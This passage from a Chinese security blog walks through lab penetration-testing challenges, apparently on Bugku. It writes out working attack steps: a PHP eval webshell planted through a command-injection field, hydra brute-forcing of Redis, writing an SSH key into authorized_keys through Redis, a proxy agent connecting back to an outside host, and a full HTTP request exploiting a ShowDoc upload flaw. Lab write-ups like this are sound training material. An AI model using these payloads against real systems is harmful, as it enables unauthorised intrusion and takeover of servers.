<p><img src="/2024/07/30/hello-world/image-20250220105112984.png" alt="image-20250220105112984"></p>
<p>成功利用弱口令登陆后台</p>
<p><img src="/2024/07/30/hello-world/image-20250220105347643.png" alt="image-20250220105347643"></p>
<p>直接上传木马</p>
<p><img src="/2024/07/30/hello-world/image-20250220105529294.png" alt="image-20250220105529294"></p>
<p>发现根目录一个flag，web目录一个flag</p>
<p><img src="/2024/07/30/hello-world/image-20250220105706879.png" alt="image-20250220105706879"></p>
<p><img src="/2024/07/30/hello-world/image-20250220105746625.png" alt="image-20250220105746625"></p>
<h2 id="渗透测试4"><a href="#渗透测试4" class="headerlink" title="渗透测试4"></a>渗透测试4</h2><p>开题<a target="_blank" rel="noopener" href="http://139.196.35.56/">http://139.196.35.56:80</a></p>
<p><img src="/2024/07/30/hello-world/image-20250221101810494.png" alt="image-20250221101810494"></p>
<h3 id="场景1-3"><a href="#场景1-3" class="headerlink" title="场景1"></a>场景1</h3><p>爆破无果，尝试更改action字段发现action字段可以rce</p>
<p><img src="/2024/07/30/hello-world/image-20250221101943200.png" alt="image-20250221101943200"></p>
<p>尝试写马</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">'echo "&lt;?php phpinfo();eval(\$_POST[1]); ?&gt;" &gt; 1.php'</span>) | phpinfo</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2024/07/30/hello-world/image-20250221102100610.png" alt="image-20250221102100610"></p>
<p>蚁剑连接</p>
<p><img src="/2024/07/30/hello-world/image-20250221102231311.png" alt="image-20250221102231311"></p>
<h3 id="场景2-2"><a href="#场景2-2" class="headerlink" title="场景2"></a>场景2</h3><p>看一下IP信息，<code>ifconfig</code>被ban了，<code>cat /etc/hosts</code></p>
<p><img src="/2024/07/30/hello-world/image-20250221102519400.png" alt="image-20250221102519400"></p>
<p>上fscan扫一下，没有ping权限，使用np参数</p>
<p><img src="/2024/07/30/hello-world/image-20250221103043632.png" alt="image-20250221103043632"></p>
<p>一个web服务一个ssh一个redis</p>
<p>全端口扫描，发现还有一个22000端口</p>
<p><img src="/2024/07/30/hello-world/image-20250221103354626.png" alt="image-20250221103354626"></p>
<p>配置代理</p>
<blockquote>
<p>./admin_linux_x64 -lport 9999</p>
<p>./agent_linux_x64 -rhost 8.134.149.24 -rport 9999</p>
</blockquote>
<p>先来打redis</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">proxychains hydra -P passwd-top22000.txt -e ns -f -V redis://192.168.0.202</span><br></pre></td></tr></tbody></table></figure>

<p>爆破得到密码为123456</p>
<p><img src="/2024/07/30/hello-world/image-20250221104203735.png" alt="image-20250221104203735"></p>
<p>写公钥</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh-keygen –t rsa <span class="comment"># 默认情况下，生成后在用户的家目录下的 .ssh 目录下 执行生成key命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; <span class="built_in">cat</span> id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; 1.txt　　<span class="comment">#将公钥写入txt</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /root/.ssh/1.txt |proxychains redis-cli -h 192.168.0.202 -p 6379 -a 123456 -x <span class="built_in">set</span> crack</span><br><span class="line"></span><br><span class="line">proxychains redis-cli -h 192.168.0.202 -p 6379 -a 123456</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh　　　　　　<span class="comment">#设置存储公钥路径</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys　　<span class="comment">#设置文件名称</span></span><br><span class="line"></span><br><span class="line">get crack <span class="comment">#查看缓存</span></span><br><span class="line"></span><br><span class="line">save <span class="comment">#保存缓存到目标主机路径及文件下</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 　<span class="comment">#退出</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/2024/07/30/hello-world/image-20250221110708904.png" alt="image-20250221110708904"></p>
<p>然后就可以进行连接了</p>
<p><code>proxychains ssh -i id_rsa -p 22000 root@192.168.0.202</code></p>
<p><img src="/2024/07/30/hello-world/image-20250221110816942.png" alt="image-20250221110816942"></p>
<p><img src="/2024/07/30/hello-world/image-20250221111012849.png" alt="image-20250221111012849"></p>
<h3 id="场景3-2"><a href="#场景3-2" class="headerlink" title="场景3"></a>场景3</h3><p><img src="/2024/07/30/hello-world/image-20250221111314222.png" alt="image-20250221111314222"></p>
<p>100机器也有22000端口</p>
<p>ssh连接 <code>ssh root@192.168.0.100 -p 22000</code></p>
<p><img src="/2024/07/30/hello-world/image-20250221111627916.png" alt="image-20250221111627916"></p>
<h3 id="场景4-3"><a href="#场景4-3" class="headerlink" title="场景4"></a>场景4</h3><p>查看hosts</p>
<p><img src="/2024/07/30/hello-world/image-20250221111746923.png" alt="image-20250221111746923"></p>
<p>wget上传fscan和venom</p>
<p><code>./fscan -h 172.16.0.233/24</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[+] 目标 172.16.0.233    存活 (ICMP)</span><br><span class="line">[+] 目标 172.16.0.1      存活 (ICMP)</span><br><span class="line">[+] 目标 172.16.0.153    存活 (ICMP)</span><br><span class="line">[+] ICMP存活主机数量: 3</span><br><span class="line">[*] 共解析 218 个有效端口</span><br><span class="line">[+] 端口开放 172.16.0.233:6379</span><br><span class="line">[+] 端口开放 172.16.0.153:80</span><br><span class="line">[+] 端口开放 172.16.0.1:22</span><br><span class="line">[+] 存活端口数量: 3</span><br><span class="line">[*] 开始漏洞扫描...</span><br><span class="line">[+] Redis扫描模块开始...</span><br><span class="line">[*] 网站标题 http://172.16.0.153       状态码:302 长度:0      标题:无标题 重定向地址: http://172.16.0.153/web/#/</span><br><span class="line">[*] 网站标题 http://172.16.0.153/web/#/ 状态码:200 长度:1739   标题:ShowDoc</span><br><span class="line">[+] Redis 172.16.0.233:6379 123456 file:/root/.ssh/authorized_keys</span><br><span class="line">[!] 扫描错误 172.16.0.1:22 - 扫描总时间超时: context deadline exceeded</span><br><span class="line">[+] Redis 172.16.0.233:6379 可写入路径 /root/.ssh/</span><br><span class="line">[+] Redis 172.16.0.233:6379 可写入路径 /var/spool/cron/</span><br></pre></td></tr></tbody></table></figure>

<p>内网还存在web服务，挂二层代理</p>
<p><img src="/2024/07/30/hello-world/image-20250221112647057.png" alt="image-20250221112647057"></p>
<p>找到showdoc的nday</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST /index.php?s=/home/page/uploadImg HTTP/1.1</span><br><span class="line">Host: 172.16.0.153</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617</span><br><span class="line">Content-Length: 265</span><br><span class="line"></span><br><span class="line">----------------------------921378126371623762173617</span><br><span class="line">Content-Disposition: form-data; name="editormd-image-file"; filename="test.&lt;&gt;php"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?php echo '123_test';@eval($_POST[cmd])?&gt;</span><br><span class="line">----------------------------921378126371623762173617--</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>



<p><img src="/2024/07/30/hello-world/image-20250221113846179.png" alt="image-20250221113846179"></p>
<p>蚁剑连接拿到flag</p>
<p><img src="/2024/07/30/hello-world/image-20250221114004317.png" alt="image-20250221114004317"></p>
<h3 id="场景5-2"><a href="#场景5-2" class="headerlink" title="场景5"></a>场景5</h3><p>下载sqlite目录里面的showdoc.db.php</p>
<p><img src="/2024/07/30/hello-world/image-20250221114308305.png" alt="image-20250221114308305"></p>
<p>发现账号密码，但是密码破解不出来</p>
<p><img src="/2024/07/30/hello-world/image-20250221114727164.png" alt="image-20250221114727164"></p>
<p>尝试用token伪造登录</p>
<p><img src="/2024/07/30/hello-world/image-20250221115455324.png" alt="image-20250221115455324"></p>
<p>root:Test@1234</p>
<p><img src="/2024/07/30/hello-world/image-20250221115439673.png" alt="image-20250221115439673"></p>
<p>扫描172.16.0.153的全端口</p>
<p><img src="/2024/07/30/hello-world/image-20250221115734696.png" alt="image-20250221115734696"></p>
<p>然后ssh连接就可以<code>proxychains ssh root@172.16.0.153 -p 22000 </code></p>
<p><img src="/2024/07/30/hello-world/image-20250221123634896.png" alt="image-20250221123634896"></p>
<p>找到最后一个flag</p>
<p>至此四个靶场全部打完</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io">P4tt0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://p4tt0n.github.io/2025/02/21/Bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951-4/">https://p4tt0n.github.io/2025/02/21/Bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951-4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://p4tt0n.github.io" target="_blank">P4tt0n's b10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cbrute4road/" title="春秋云镜brute4road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">春秋云镜brute4road</div></div></a></div><div class="next-post pull-right"><a href="/2024/12/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/" title="Java反序列化基础篇-01-反序列化概念与利用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Java反序列化基础篇-01-反序列化概念与利用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/" title="春秋云镜Initial"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="title">春秋云镜Initial</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/" title="春秋云镜Time"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Time</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/" title="春秋云镜Tsclient"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜Tsclient</div></div></a></div><div><a href="/2025/02/23/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cbrute4road/" title="春秋云镜brute4road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-23</div><div class="title">春秋云镜brute4road</div></div></a></div><div><a href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="title">春秋云镜Hospital</div></div></a></div><div><a href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Ccertify/" title="春秋云镜certify"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="title">春秋云镜certify</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">P4tt0n</div><div class="author-info__description">徐徐前进！</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/p4tt0n"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951"><span class="toc-number">1.</span> <span class="toc-text">渗透测试1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF1"><span class="toc-number">1.1.</span> <span class="toc-text">场景1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF2"><span class="toc-number">1.2.</span> <span class="toc-text">场景2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF3"><span class="toc-number">1.3.</span> <span class="toc-text">场景3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF4"><span class="toc-number">1.4.</span> <span class="toc-text">场景4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF5"><span class="toc-number">1.5.</span> <span class="toc-text">场景5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF6"><span class="toc-number">1.6.</span> <span class="toc-text">场景6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF7"><span class="toc-number">1.7.</span> <span class="toc-text">场景7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF8"><span class="toc-number">1.8.</span> <span class="toc-text">场景8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF9"><span class="toc-number">1.9.</span> <span class="toc-text">场景9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF10"><span class="toc-number">1.10.</span> <span class="toc-text">场景10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF11"><span class="toc-number">1.11.</span> <span class="toc-text">场景11</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952"><span class="toc-number">2.</span> <span class="toc-text">渗透测试2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF1-1"><span class="toc-number">2.1.</span> <span class="toc-text">场景1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF2-1"><span class="toc-number">2.2.</span> <span class="toc-text">场景2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF3-1"><span class="toc-number">2.3.</span> <span class="toc-text">场景3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF4-1"><span class="toc-number">2.4.</span> <span class="toc-text">场景4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF5-1"><span class="toc-number">2.5.</span> <span class="toc-text">场景5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF6-1"><span class="toc-number">2.6.</span> <span class="toc-text">场景6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF7-1"><span class="toc-number">2.7.</span> <span class="toc-text">场景7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF8-1"><span class="toc-number">2.8.</span> <span class="toc-text">场景8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF9-1"><span class="toc-number">2.9.</span> <span class="toc-text">场景9</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953"><span class="toc-number">3.</span> <span class="toc-text">渗透测试3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF1-2"><span class="toc-number">3.1.</span> <span class="toc-text">场景1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF2-%E5%9C%BA%E6%99%AF3"><span class="toc-number">3.2.</span> <span class="toc-text">场景2&amp;场景3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF4-2"><span class="toc-number">3.3.</span> <span class="toc-text">场景4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF7-%E5%9C%BA%E6%99%AF8"><span class="toc-number">3.4.</span> <span class="toc-text">场景7&amp;场景8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF5-%E5%9C%BA%E6%99%AF6"><span class="toc-number">3.5.</span> <span class="toc-text">场景5&amp;场景6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%954"><span class="toc-number">4.</span> <span class="toc-text">渗透测试4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF1-3"><span class="toc-number">4.1.</span> <span class="toc-text">场景1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF2-2"><span class="toc-number">4.2.</span> <span class="toc-text">场景2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF3-2"><span class="toc-number">4.3.</span> <span class="toc-text">场景3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF4-3"><span class="toc-number">4.4.</span> <span class="toc-text">场景4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF5-2"><span class="toc-number">4.5.</span> <span class="toc-text">场景5</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/10/2024FIC%E7%BA%BF%E4%B8%8A%E8%B5%9B-%E6%9C%8D%E5%8A%A1%E5%99%A8wp/" title="2024FIC线上赛-服务器wp">2024FIC线上赛-服务器wp</a><time datetime="2025-04-10T01:53:16.000Z" title="发表于 2025-04-10 09:53:16">2025-04-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cprivilege-wp/" title="春秋云镜privilege-wp">春秋云镜privilege-wp</a><time datetime="2025-03-02T10:50:47.000Z" title="发表于 2025-03-02 18:50:47">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/" title="春秋云镜Hospital">春秋云镜Hospital</a><time datetime="2025-03-02T10:09:09.000Z" title="发表于 2025-03-02 18:09:09">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cexchange/" title="春秋云镜exchange">春秋云镜exchange</a><time datetime="2025-03-02T10:08:48.000Z" title="发表于 2025-03-02 18:08:48">2025-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cdelegation/" title="春秋云镜delegation">春秋云镜delegation</a><time datetime="2025-03-02T10:08:33.000Z" title="发表于 2025-03-02 18:08:33">2025-03-02</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2025 By P4tt0n</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.14.0-b3"></script><script src="/js/main.js?v=4.14.0-b3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const runMermaid = (ele) => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    Array.from(ele).forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
      const mermaidID = 'mermaid-' + index
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)

      const renderV10 = () => {
        renderFn.then(({svg}) => {
          mermaidSrc.insertAdjacentHTML('afterend', svg)
        })
      }

      const renderV9 = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return
    
    codeMermaidEle.forEach(ele => {
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.innerHTML = `<pre class="mermaid-src" hidden>${ele.textContent}</pre>`
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@10.9.0/dist/mermaid.min.js').then(runMermaidFn)
  }
  
  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>